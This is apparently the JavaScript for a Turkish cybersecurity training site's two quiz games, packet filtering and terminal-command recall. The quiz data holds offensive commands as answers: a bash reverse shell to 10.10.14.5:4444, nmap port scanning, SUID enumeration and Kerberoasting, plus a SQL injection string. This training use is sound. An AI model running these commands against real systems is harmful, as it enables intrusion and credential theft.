/**
 * BZT Cyber Security - Interactive Cyber Games Engine (v3.5 PRO)
 * Game 1: Firewall Packet Defender (Real-Time Packet Filtering)
 * Game 2: Terminal Command Rush (Speed & Accuracy Challenge)
 */

const BZTGames = {
  // =========================================================================
  // GAME 1: FIREWALL PACKET DEFENDER
  // =========================================================================
  fwGame: {
    isRunning: false,
    score: 0,
    lives: 3,
    streak: 0,
    currentPacket: null,
    timer: null,

    packetsPool: [
      { ip: "192.168.1.50", port: 443, proto: "TCP", flag: "ACK", desc: "Meşru HTTPS Web Trafiği (TLS 1.3)", isMalicious: false },
      { ip: "10.0.0.12", port: 53, proto: "UDP", flag: "DNS", desc: "Güvenilir DNS Sorgusu (google.com)", isMalicious: false },
      { ip: "185.220.101.5", port: 21, proto: "TCP", flag: "SYN", desc: "vsftpd 2.3.4 Arka Kapı İstismar Paketi", isMalicious: true },
      { ip: "45.154.255.88", port: 445, proto: "TCP", flag: "SYN", desc: "SMB EternalBlue (MS17-010) İstismar Denemesi", isMalicious: true },
      { ip: "172.16.0.4", port: 22, proto: "TCP", flag: "ACK", desc: "Sistem Yöneticisi SSH Güvenli Oturumu", isMalicious: false },
      { ip: "91.240.118.17", port: 80, proto: "TCP", flag: "PSH/ACK", desc: "SQLi: /login.php?user=admin' OR 1=1--", isMalicious: true },
      { ip: "192.168.1.105", port: 80, proto: "TCP", flag: "ACK", desc: "Normal HTTP GET /index.html Sayfa İsteği", isMalicious: false },
      { ip: "194.26.29.112", port: 3389, proto: "TCP", flag: "SYN", desc: "RDP Brute-Force Parola Saldırısı (1000 req/s)", isMalicious: true },
      { ip: "10.10.14.5", port: 4444, proto: "TCP", flag: "SYN/ACK", desc: "Reverse Shell Ters Bağlantı İstemi (Meterpreter)", isMalicious: true },
      { ip: "10.0.0.25", port: 123, proto: "UDP", flag: "NTP", desc: "Ağ Zaman Protokolü (NTP Senkronizasyonu)", isMalicious: false }
    ],

    start() {
      this.isRunning = true;
      this.score = 0;
      this.lives = 3;
      this.streak = 0;
      this.updateUI();
      this.nextPacket();
    },

    nextPacket() {
      if (!this.isRunning) return;
      const idx = Math.floor(Math.random() * this.packetsPool.length);
      this.currentPacket = this.packetsPool[idx];

      const display = document.getElementById("fw-packet-card");
      if (!display) return;

      display.className = "p-5 rounded-2xl border bg-black/80 font-mono text-xs space-y-2 border-cyan-500/60 shadow-2xl glow-cyan-sm animate-fade-in";
      display.innerHTML = `
        <div class="flex justify-between items-center pb-2 border-b border-gray-800">
          <span class="text-cyan-400 font-bold">GELEN PAKET: ${this.currentPacket.proto}</span>
          <span class="px-2 py-0.5 rounded bg-gray-900 text-yellow-300">Port ${this.currentPacket.port}</span>
        </div>
        <div class="grid grid-cols-2 gap-2 text-gray-300">
          <div><span class="text-gray-500">Kaynak IP:</span> <b class="text-white">${this.currentPacket.ip}</b></div>
          <div><span class="text-gray-500">Bayrak:</span> <b class="text-emerald-400">${this.currentPacket.flag}</b></div>
        </div>
        <div class="pt-2">
          <span class="text-gray-500">Paket İnceleme (DPI):</span>
          <div class="p-2 bg-gray-950 rounded text-cyan-200 mt-1">${this.currentPacket.desc}</div>
        </div>
      `;
    },

    decide(action) {
      if (!this.isRunning || !this.currentPacket) return;

      const shouldDrop = this.currentPacket.isMalicious;
      const userDropped = (action === "DROP");

      const feedback = document.getElementById("fw-feedback");

      if (shouldDrop === userDropped) {
        // Correct decision!
        this.streak++;
        const points = 20 * (this.streak >= 3 ? 2 : 1);
        this.score += points;
        if (window.BZTApp) window.BZTApp.addXp(points);

        if (feedback) {
          feedback.innerHTML = `<span class="text-emerald-400 font-bold">✓ DOĞRU KARAR! (+${points} XP) Kombo x${this.streak}</span>`;
        }
      } else {
        // Wrong decision!
        this.streak = 0;
        this.lives--;
        if (feedback) {
          feedback.innerHTML = `<span class="text-red-400 font-bold">❌ HATALI KARAR! ${shouldDrop ? 'Zararlı paket ağa sızdı!' : 'Meşru kullanıcı trafiği engellendi!'} (-1 Can)</span>`;
        }

        if (this.lives <= 0) {
          this.gameOver();
          return;
        }
      }

      this.updateUI();
      setTimeout(() => this.nextPacket(), 400);
    },

    updateUI() {
      const scoreEl = document.getElementById("fw-score");
      const livesEl = document.getElementById("fw-lives");
      const streakEl = document.getElementById("fw-streak");

      if (scoreEl) scoreEl.innerText = this.score;
      if (livesEl) livesEl.innerText = "❤️".repeat(Math.max(0, this.lives));
      if (streakEl) streakEl.innerText = `x${this.streak}`;
    },

    gameOver() {
      this.isRunning = false;
      const display = document.getElementById("fw-packet-card");
      if (display) {
        display.className = "p-6 rounded-2xl border border-red-500/50 bg-red-950/40 text-center space-y-3";
        display.innerHTML = `
          <div class="text-3xl">💀</div>
          <h3 class="text-xl font-bold text-red-400">GÜVENLİK DUVARI ÇÖKTÜ!</h3>
          <p class="text-xs text-gray-300">Toplam Puan: <b>${this.score}</b></p>
          <button onclick="BZTGames.fwGame.start()" class="px-5 py-2 rounded-xl bg-cyan-500 text-black font-bold font-mono text-xs">
            Tekrar Oyna 🔄
          </button>
        `;
      }
    }
  },

  // =========================================================================
  // GAME 2: TERMINAL COMMAND RUSH
  // =========================================================================
  cmdGame: {
    isRunning: false,
    score: 0,
    currentIndex: 0,
    timer: null,
    timeLeft: 15,

    challenges: [
      {
        prompt: "Hedef Linux sistemdeki tüm SUID yetkili binary dosyaları tespit et:",
        correct: "find / -perm -4000 -type f 2>/dev/null",
        options: [
          "find / -perm -4000 -type f 2>/dev/null",
          "ls -la /root/suid",
          "grep -r 'SUID' /etc/*",
          "chmod +s /bin/*"
        ]
      },
      {
        prompt: "10.10.10.50 hedefinin 1-65535 arasındaki TÜM portlarını SYN taraması ile tara:",
        correct: "nmap -sS -p- 10.10.10.50",
        options: [
          "nmap -sS -p- 10.10.10.50",
          "ping -c 65535 10.10.10.50",
          "nmap -sn 10.10.10.50",
          "netstat -all 10.10.10.50"
        ]
      },
      {
        prompt: "Kurbanın bash kabuğunu 10.10.14.5:4444 adresine yönlendiren Reverse Shell tek satırlığı:",
        correct: "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1",
        options: [
          "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1",
          "ssh root@10.10.14.5 -p 4444",
          "curl http://10.10.14.5:4444/shell",
          "nc -lvnp 4444"
        ]
      },
      {
        prompt: "Active Directory ortamında Kerberoasting saldırısı için TGS biletlerini talep eden komut:",
        correct: "GetUserSPNs.py domain/user:pass -request",
        options: [
          "GetUserSPNs.py domain/user:pass -request",
          "mimikatz # lsadump::sam",
          "crackmapexec winrm 10.10.10.1",
          "bloodhound --dump"
        ]
      },
      {
        prompt: "Sudo şifresiz komut listesini sorgulayan temel Linux komutu:",
        correct: "sudo -l",
        options: [
          "sudo -l",
          "cat /etc/sudo",
          "whoami /priv",
          "sudo --check"
        ]
      }
    ],

    start() {
      this.isRunning = true;
      this.score = 0;
      this.currentIndex = 0;
      this.nextChallenge();
    },

    nextChallenge() {
      if (this.currentIndex >= this.challenges.length) {
        this.finish();
        return;
      }

      const ch = this.challenges[this.currentIndex];
      const card = document.getElementById("cmd-rush-card");
      if (!card) return;

      this.timeLeft = 15;
      clearInterval(this.timer);
      this.timer = setInterval(() => {
        this.timeLeft--;
        const tEl = document.getElementById("rush-timer");
        if (tEl) tEl.innerText = `${this.timeLeft}s`;
        if (this.timeLeft <= 0) {
          clearInterval(this.timer);
          this.currentIndex++;
          this.nextChallenge();
        }
      }, 1000);

      card.innerHTML = `
        <div class="space-y-4 animate-fade-in">
          <div class="flex justify-between items-center text-xs font-mono">
            <span class="text-cyan-400 font-bold">GÖREV ${this.currentIndex + 1} / ${this.challenges.length}</span>
            <span id="rush-timer" class="px-2 py-0.5 rounded bg-red-950 text-red-400 font-bold">15s</span>
          </div>

          <div class="text-sm font-semibold text-white">${ch.prompt}</div>

          <div class="grid grid-cols-1 gap-2.5 pt-2">
            ${ch.options.map(opt => `
              <button onclick="BZTGames.cmdGame.answer('${encodeURIComponent(opt)}')" class="text-left p-3 rounded-xl border border-gray-800 hover:border-cyan-500/50 bg-black/60 hover:bg-cyan-950/20 text-xs font-mono text-gray-200 transition-all">
                $ ${opt}
              </button>
            `).join("")}
          </div>
        </div>
      `;
    },

    answer(encodedOpt) {
      clearInterval(this.timer);
      const opt = decodeURIComponent(encodedOpt);
      const ch = this.challenges[this.currentIndex];

      const feedback = document.getElementById("rush-feedback");

      if (opt === ch.correct) {
        const bonus = this.timeLeft * 5;
        const total = 50 + bonus;
        this.score += total;
        if (window.BZTApp) window.BZTApp.addXp(total);
        if (feedback) feedback.innerHTML = `<span class="text-emerald-400 font-bold">✓ HARİKA! (+${total} XP)</span>`;
      } else {
        if (feedback) feedback.innerHTML = `<span class="text-red-400 font-bold">❌ Yanlış Komut! Doğrusu: ${ch.correct}</span>`;
      }

      this.currentIndex++;
      setTimeout(() => this.nextChallenge(), 700);
    },

    finish() {
      this.isRunning = false;
      clearInterval(this.timer);
      const card = document.getElementById("cmd-rush-card");
      if (card) {
        card.innerHTML = `
          <div class="p-6 text-center space-y-3 animate-fade-in">
            <div class="text-3xl">🏆</div>
            <h3 class="text-xl font-bold text-emerald-400">COMMAND RUSH TAMAMLANDI!</h3>
            <p class="text-xs text-gray-300 font-mono">Toplam Skor: <b class="text-yellow-400">${this.score} XP</b></p>
            <button onclick="BZTGames.cmdGame.start()" class="px-5 py-2 rounded-xl bg-gradient-to-r from-cyan-500 to-emerald-400 text-black font-bold font-mono text-xs">
              Tekrar Oyna 🔄
            </button>
          </div>
        `;
      }
    }
  }
};

window.BZTGames = BZTGames;
